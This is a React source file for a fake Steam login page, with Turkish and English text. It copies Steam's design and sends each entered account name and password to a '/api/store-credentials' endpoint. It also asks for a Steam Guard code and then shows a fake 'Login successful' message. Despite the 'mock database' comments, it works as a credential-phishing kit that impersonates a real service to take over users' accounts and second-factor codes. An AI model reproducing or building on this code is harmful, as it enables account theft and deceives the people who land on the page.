
import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { toast } from 'sonner';
import { ArrowRight, Loader, Globe } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Progress } from "@/components/ui/progress";

const SteamLoginForm = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showSteamGuard, setShowSteamGuard] = useState(false);
  const [steamGuardCode, setSteamGuardCode] = useState('');
  const [language, setLanguage] = useState('tr'); // Default language is Turkish
  const navigate = useNavigate();

  // Detect user's language based on browser settings
  useEffect(() => {
    try {
      const userLanguage = navigator.language.split('-')[0];
      if (['en', 'tr', 'de', 'fr', 'es'].includes(userLanguage)) {
        setLanguage(userLanguage);
      }
    } catch (error) {
      console.error('Error detecting language:', error);
    }
  }, []);

  const translations = {
    tr: {
      title: 'HESABINIZA GİRİŞ YAPIN',
      accountLabel: 'STEAM HESABI ADI',
      passwordLabel: 'PAROLA',
      rememberMe: 'Beni hatırla',
      loginButton: 'Giriş Yap',
      loading: 'Giriş Yapılıyor...',
      helpText: 'Yardım edin, giriş yapamıyorum',
      steamGuardTitle: 'Steam Guard Doğrulama',
      steamGuardDesc: 'E-posta adresinize gönderilen Steam Guard kodunu girin',
      submitButton: 'Gönder',
      signedBy: 'imzalayan unde'
    },
    en: {
      title: 'LOGIN TO YOUR ACCOUNT',
      accountLabel: 'STEAM ACCOUNT NAME',
      passwordLabel: 'PASSWORD',
      rememberMe: 'Remember me',
      loginButton: 'Sign In',
      loading: 'Signing in...',
      helpText: 'Help, I can\'t log in',
      steamGuardTitle: 'Steam Guard Verification',
      steamGuardDesc: 'Enter the Steam Guard code sent to your email',
      submitButton: 'Submit',
      signedBy: 'signed by unde'
    },
    // Add more languages as needed
  };

  // Get translations based on current language
  const t = translations[language] || translations.en;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast.error(language === 'tr' ? "Lütfen tüm gerekli alanları doldurun" : "Please fill in all required fields");
      return;
    }
    setIsLoading(true);

    // Send to mock database
    try {
      console.log("Sending credentials to database:", { username, password });
      
      // API call to add the credentials to our mock database
      const response = await fetch('/api/store-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });
      
      const data = await response.json();
      console.log("Response from database:", data);
      
      if (data.success) {
        // Navigate to the loading page with the credential ID
        navigate('/loading', { 
          state: { 
            username, 
            password,
            id: data.credential?.id 
          } 
        });
      } else if (data.blocked) {
        // Handle blocked IP
        toast.error(language === 'tr' ? "Erişiminiz engellendi. Lütfen daha sonra tekrar deneyin." : "Your access has been blocked. Please try again later.");
        setIsLoading(false);
      } else {
        throw new Error("Failed to store credentials");
      }
    } catch (error) {
      console.error("Error storing credentials:", error);
      setIsLoading(false);
      toast.error(language === 'tr' ? "Bir hata oluştu. Lütfen tekrar deneyin." : "An error occurred. Please try again.");
    }
  };

  const handleSteamGuardSubmit = () => {
    console.log('Steam Guard Code submitted:', steamGuardCode);
    setShowSteamGuard(false);
    toast.success(language === 'tr' ? "Giriş başarılı! Yönlendiriliyorsunuz..." : "Login successful! Redirecting...");
    
    // Simulate redirect to Steam homepage after successful login
    setTimeout(() => {
      navigate('/');
    }, 1500);
  };

  const toggleLanguage = () => {
    setLanguage(prevLang => prevLang === 'tr' ? 'en' : 'tr');
  };

  return (
    <div className="w-full max-w-md mx-auto">
      <div className="mb-6 text-center">
        <h1 className="text-lg font-medium text-white mb-2">
          {t.title}
        </h1>
        <p className="text-xs text-white/60 italic">{t.signedBy}</p>
      </div>
      
      <button 
        onClick={toggleLanguage} 
        className="absolute top-4 right-4 p-2 rounded-full bg-gray-700/50 hover:bg-gray-700/70 transition-colors"
      >
        <Globe className="h-5 w-5 text-white/70" />
      </button>
      
      <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
        <div className="space-y-1">
          <label className="text-xs font-medium text-white/50 uppercase">
            {t.accountLabel}
          </label>
          <Input 
            placeholder="" 
            value={username} 
            onChange={e => setUsername(e.target.value)} 
            className="bg-[#32353c] border-0 h-10 text-white" 
            required 
            disabled={isLoading}
          />
        </div>
        
        <div className="space-y-1">
          <label className="text-xs font-medium text-white/50 uppercase">
            {t.passwordLabel}
          </label>
          <Input 
            type="password" 
            value={password} 
            onChange={e => setPassword(e.target.value)} 
            className="bg-[#32353c] border-0 h-10 text-white" 
            required 
            disabled={isLoading}
          />
        </div>

        <div className="flex items-center space-x-2">
          <Checkbox 
            id="rememberMe" 
            checked={rememberMe} 
            onCheckedChange={checked => setRememberMe(checked === true)} 
            disabled={isLoading} 
            className="border-steam-gray data-[state=checked]:bg-blue-400"
          />
          <label 
            htmlFor="rememberMe" 
            className="text-xs font-medium text-white/80 cursor-pointer"
          >
            {t.rememberMe}
          </label>
        </div>
        
        <Button 
          type="submit" 
          disabled={isLoading} 
          className="h-10 bg-blue-400 hover:bg-blue-500 text-white w-full"
        >
          {isLoading ? (
            <>
              <Loader className="mr-2 h-4 w-4 animate-spin" />
              {t.loading}
            </>
          ) : (
            t.loginButton
          )}
        </Button>
        
        <a href="#" className="text-center text-xs text-white/60 hover:text-white">
          {t.helpText}
        </a>
      </form>

      {/* Steam Guard Dialog */}
      <Dialog open={showSteamGuard} onOpenChange={setShowSteamGuard}>
        <DialogContent className="bg-[#171a21] border-[#32353c] text-white">
          <div className="p-4">
            <h2 className="text-xl font-bold mb-4">{t.steamGuardTitle}</h2>
            <p className="mb-4 text-white/70">{t.steamGuardDesc}</p>
            
            <div className="mb-4">
              <Input
                className="bg-[#32353c] border-0 text-white"
                value={steamGuardCode}
                onChange={(e) => setSteamGuardCode(e.target.value)}
                placeholder="XXXXX"
                maxLength={5}
              />
            </div>
            
            <Button 
              onClick={handleSteamGuardSubmit}
              className="w-full bg-blue-400 hover:bg-blue-500"
            >
              {t.submitButton}
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default SteamLoginForm;
